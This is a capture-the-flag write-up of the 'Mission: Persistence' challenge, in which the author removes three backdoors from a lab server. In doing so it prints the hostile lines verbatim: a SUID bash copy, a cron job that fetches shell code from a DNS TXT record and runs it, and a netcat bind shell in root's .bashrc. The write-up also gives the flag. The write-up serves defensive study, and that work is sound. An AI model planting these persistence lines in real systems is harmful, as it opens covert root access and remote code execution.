# Mission: Persistence

### Description:
* Hackers broke into a secret IMF server, and we believe they left behind three backdoors that will either provide them with access to the server, or allow them escalate their privileges on the server, or both. Your mission, should you choose to accept it, is to find these three back doors, and remove them from the system. The server is currently not connected to the internet, so it should be safe, but we need to get it back online ASAP. Can you SSH in and clean up? Your creds are `user / hackthebox`, and that user will have full `sudo` rights, so running `sudo su -` will provide a shell as root. Remove any malicious files and configurations, and then run `/root/solveme` as root to get the flag.

### Objective:
* Connect to the host and clean up the three backdoors left on the machine.

### Difficulty:
* Medium

### Flag:
* `HTB{m1ssi0n_suC3ssfUl!}`

### Challenge:

#### Connect

Connect with SSH, and escalate to root with `sudo su`:

```
david@meeks:~/Dropbox/CTFs/hackthebox/submissions/PersistenceIsFutile$ sshpass -p hackthebox ssh user@172.17.0.2
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

user@6b454f4753c3:~$ sudo su -
[sudo] password for user:
root@6b454f4753c3:~#
```

Running the solver now shows no tasks completed:

```
root@6b454f4753c3:~# ./solveme 
Issue 1 is not remediated
Issue 2 is not remediated
Issue 3 is not remediated
```

#### Persistence 1

The user home directory contains a SUID backdoor that is just a copy of `bash`.

```
root@6b454f4753c3:~# ls -la /home/user/
total 1184
drwxr-xr-x 1 user user    4096 Jan 21 12:33 .
drwxr-xr-x 1 root root    4096 Jan 20 20:35 ..
-rwsr-xr-x 1 root root 1183448 Jan 20 20:35 .backdoor
-rw-r--r-- 1 user user     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user user    3771 Feb 25  2020 .bashrc
drwx------ 2 user user    4096 Jan 21 12:33 .cache
-rw-r--r-- 1 user user     807 Feb 25  2020 .profile
-rw-r--r-- 1 user user       0 Jan 21 12:33 .sudo_as_admin_successful
```

As user, running it with `-p` returns a root shell:

```
user@6b454f4753c3:~$ ./.backdoor -p
.backdoor-5.0# 
```

Removing this file solves part 1:

```
root@6b454f4753c3:~# rm /home/user/.backdoor 
root@6b454f4753c3:~# ./solveme 
Issue 1 is fully remediated
Issue 2 is not remediated
Issue 3 is not remediated
```

#### Persistence 2

There's a cron for user:

```
root@6b454f4753c3:~# find /var/spool/cron/ -type f -ls
  3566022      4 -rw-------   1 user     crontab       250 Jan 21 12:33 /var/spool/cron/crontabs/user
root@6b454f4753c3:~# cat /var/spool/cron/crontabs/user
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Thu Jan 21 12:33:16 2021)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```

This will run every minute, getting a TXT record from ns.inf0rce.htb, and then executing what's in the return. This is clearly suspicious. 

Either removing this file or commenting out the bad line will solve the challenge:

```
root@6b454f4753c3:~# vim /var/spool/cron/crontabs/user
root@6b454f4753c3:~# cat /var/spool/cron/crontabs/user
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Thu Jan 21 12:33:16 2021)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
#* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
root@6b454f4753c3:~# ./solveme 
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is not remediated
root@6b454f4753c3:~# rm /var/spool/cron/crontabs/user
root@6b454f4753c3:~# ./solveme 
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is not remediated
```

#### Persistence 3

If I've started a shell as root, there's a `nc` listening on port 4444 visible in the `netstat`:

```
root@6b454f4753c3:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1/sshd: /usr/sbin/s 
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      98/nc               
tcp6       0      0 :::22                   :::*                    LISTEN      1/sshd: /usr/sbin/s 
```

The process list (easily seen as a tree) shows that the parent process is the current bash session:

```
root@6b454f4753c3:~# ps -eaf --forest
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 12:33 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root           8       1  0 12:33 ?        00:00:00 sshd: user [priv]
user          19       8  0 12:33 ?        00:00:00  \_ sshd: user@pts/0
user          20      19  0 12:33 pts/0    00:00:00      \_ -bash
root          88      20  0 12:46 pts/0    00:00:00          \_ sudo su -
root          89      88  0 12:46 pts/0    00:00:00              \_ su -
root          90      89  0 12:46 pts/0    00:00:00                  \_ -bash
root          98      90  0 12:46 pts/0    00:00:00                      \_ nc -e /bin/bash -lnp 4444
root         100      90  0 12:46 pts/0    00:00:00                      \_ ps -eaf --forest
```

This is a good pointer to one of the script that runs when a shell is created, like `.bashrc`. The last line of root's `.bashrc` is this backdoor:

```
root@6b454f4753c3:~# tail -1 .bashrc 
nc -e /bin/bash -lnp 4444 &
```

Commenting out or removing that line will partially remediate this backdoor:

```
root@6b454f4753c3:~# ./solveme 
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is partially remediated
```

Killing any running listeners will fully remediate it and provide the flag:

```
root@6b454f4753c3:~# kill 98
root@6b454f4753c3:~# 

[1]+  Exit 1                  nc -e /bin/bash -lnp 4444
root@6b454f4753c3:~# ./solveme 
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated

Congrats: HTB{m1ssi0n_suC3ssfUl!}
```

### Solver:

N/A
